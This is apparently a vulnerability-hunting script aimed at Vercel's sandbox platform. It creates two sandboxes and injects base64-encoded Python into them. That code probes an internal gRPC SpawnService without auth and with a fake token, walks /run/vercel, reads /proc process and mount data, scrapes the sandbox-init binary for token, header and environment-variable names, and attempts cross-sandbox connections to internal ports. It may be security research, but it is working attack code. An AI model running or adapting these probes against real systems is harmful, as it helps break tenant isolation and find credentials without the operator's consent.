# -*- coding: utf-8 -*-
"""gRPC 面: (1) 正确路径 Ping 认证行为 (2) token 来源排查 (3) B->A 跨沙箱 (IP 拼入脚本)"""
import json, sys, time, base64
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

def log(s):
    print(s, flush=True)

def run_cmd(sid, command, args, timeout_ms=30000):
    c, r = api("POST", "/v2/sandboxes/sessions/%s/cmd?teamId=%s" % (sid, TEAM),
               {"command": command, "args": args, "wait": True, "logs": True, "timeout": timeout_ms})
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try: out += json.loads(line).get('data', '')
            except Exception: pass
    return c, out

c, r = api("POST", "/v2/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": "loc10a"})
if c != 200:
    log('A create failed: %s' % r[:200]); sys.exit(1)
sida = json.loads(r)["sandbox"]["currentSessionId"]
c, r = api("POST", "/v2/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": "loc10b"})
if c != 200:
    log('B create failed: %s' % r[:200]); sys.exit(1)
sidb = json.loads(r)["sandbox"]["currentSessionId"]
log('A: %s  B: %s' % (sida, sidb))
time.sleep(3)

# 1) A: 正确路径 Connect Ping (TCP 23456 + init.sock)
log('')
log('===== 1) A: connect ping correct path =====')
A1 = '''import socket, time
P = b'/vercel.sandbox.spawn.v1.SpawnService/Ping'
body = b'{}'
def req(port, extra_headers=b''):
    s = socket.socket(); s.settimeout(3)
    try:
        s.connect(('127.0.0.1', port))
        hdr = (b'POST ' + P + b' HTTP/1.1\\r\\nHost: localhost\\r\\n'
               b'Content-Type: application/json\\r\\nConnect-Protocol-Version: 1\\r\\n'
               b'Accept: application/json\\r\\n') + extra_headers + (b'Content-Length: %d\\r\\n\\r\\n' % len(body))
        s.sendall(hdr + body)
        time.sleep(0.5)
        d = b''
        try:
            while True:
                ch = s.recv(4096)
                if not ch: break
                d += ch
                if len(d) > 4000: break
        except Exception:
            pass
        return d[:400]
    except Exception as e:
        return ('ERR ' + type(e).__name__).encode()
    finally:
        s.close()
print('tcp noauth  :', req(23456), flush=True)
print('tcp auth1   :', req(23456, b'Authorization: Bearer test\\r\\n'), flush=True)
# init.sock 面
def req_sock(payload):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect('/run/vercel/share/init.sock')
        s.sendall(payload)
        time.sleep(0.5)
        d = b''
        try:
            while True:
                ch = s.recv(4096)
                if not ch: break
                d += ch
                if len(d) > 4000: break
        except Exception:
            pass
        return d[:400]
    except Exception as e:
        return ('ERR ' + type(e).__name__).encode()
    finally:
        s.close()
hdr = (b'POST ' + P + b' HTTP/1.1\\r\\nHost: localhost\\r\\n'
       b'Content-Type: application/json\\r\\nConnect-Protocol-Version: 1\\r\\n'
       b'Accept: application/json\\r\\nContent-Length: 2\\r\\n\\r\\n')
print('sock noauth :', req_sock(hdr + body), flush=True)
'''
b64 = base64.b64encode(A1.encode()).decode()
c2, out = run_cmd(sida, 'sh', ['-c', 'echo %s | base64 -d | python3' % b64], 60000)
log(out[:2500])

# 2) A: token 来源排查
log('')
log('===== 2) A: token source =====')
A2 = '''import re, os
# cmdline
try:
    print('cmdline:', open('/proc/1/cmdline','rb').read()[:300], flush=True)
except Exception as e:
    print('cmdline ERR', type(e).__name__, flush=True)
# share 目录递归
try:
    for root, dirs, files in os.walk('/run/vercel'):
        for f in files:
            p = os.path.join(root, f)
            st = os.stat(p)
            print('FILE', p, oct(st.st_mode & 0o777), st.st_size, flush=True)
except Exception as e:
    print('walk ERR', type(e).__name__, flush=True)
# 挂载点
try:
    for ln in open('/proc/self/mountinfo'):
        if 'vercel' in ln or 'share' in ln:
            print('MOUNT', ln[:200], flush=True)
except Exception as e:
    print('mount ERR', type(e).__name__, flush=True)
# 二进制中 auth 相关上下文: 找 auth.go 函数名和 header 名
data = open('/run/vercel/share/sandbox-init','rb').read()
for pat in [rb'[A-Za-z0-9_.-]{4,50}[Tt]oken', rb'X-[A-Za-z0-9-]{3,40}', rb'VERCEL_[A-Z0-9_]{3,40}', rb'bearer', rb'Bearer']:
    seen = set()
    for m in re.finditer(pat, data):
        s = m.group().decode(errors='replace')
        if s not in seen and '/go/' not in s and 'golang' not in s and len(s) < 60:
            seen.add(s)
            print('STR', s, flush=True)
'''
b64 = base64.b64encode(A2.encode()).decode()
c2, out = run_cmd(sida, 'sh', ['-c', 'echo %s | base64 -d | python3' % b64], 60000)
log(out[-3000:])

# 3) B->A 跨沙箱 (IP 拼入脚本)
log('')
log('===== 3) B->A cross-sandbox =====')
A3 = '''import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    s.connect(('172.31.0.2', 53))
    print(s.getsockname()[0], flush=True)
except Exception:
    print('ERR', flush=True)
'''
b64 = base64.b64encode(A3.encode()).decode()
c2, out = run_cmd(sida, 'sh', ['-c', 'echo %s | base64 -d | python3' % b64], 30000)
aip = out.strip().splitlines()[-1] if out.strip() else ''
log('AIP = %s' % aip)

B1 = '''import socket, time
aip = '__AIP__'
print('TARGET', aip, flush=True)
for port in [23456, 26661]:
    s = socket.socket(); s.settimeout(3)
    try:
        rc = s.connect_ex((aip, port))
        print('connect', aip, port, 'RC', rc, flush=True)
        if rc == 0:
            P = b'/vercel.sandbox.spawn.v1.SpawnService/Ping'
            body = b'{}'
            hdr = (b'POST ' + P + b' HTTP/1.1\\r\\nHost: ' + aip.encode() + b'\\r\\n'
                   b'Content-Type: application/json\\r\\nConnect-Protocol-Version: 1\\r\\n'
                   b'Accept: application/json\\r\\nContent-Length: 2\\r\\n\\r\\n')
            s.sendall(hdr + body)
            time.sleep(0.6)
            try:
                d = s.recv(4096)
                print('  resp', repr(d[:300]), flush=True)
            except Exception as e:
                print('  noresp', type(e).__name__, flush=True)
    except Exception as e:
        print('err', type(e).__name__, flush=True)
    finally:
        s.close()
'''
B1 = B1.replace('__AIP__', aip)
b64 = base64.b64encode(B1.encode()).decode()
c2, out = run_cmd(sidb, 'sh', ['-c', 'echo %s | base64 -d | python3' % b64], 60000)
log('B->A: %s' % out[-1800:])

api("DELETE", "/v2/sandboxes/loc10a?teamId=%s&projectId=%s" % (TEAM, PROJ))
api("DELETE", "/v2/sandboxes/loc10b?teamId=%s&projectId=%s" % (TEAM, PROJ))
log('DONE')
